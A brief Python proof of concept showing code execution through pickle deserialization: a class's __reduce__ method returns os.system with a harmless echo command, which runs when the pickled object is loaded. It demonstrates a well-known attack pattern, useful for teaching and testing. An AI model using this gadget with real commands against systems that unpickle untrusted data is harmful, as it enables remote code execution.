import pickle
import os

x = os.system


class PickleKlass(object):

    def __reduce__(self):
        global x
        return x, ('echo "Hello World"',)


raw = pickle.dumps(PickleKlass())
pickle.loads(raw)
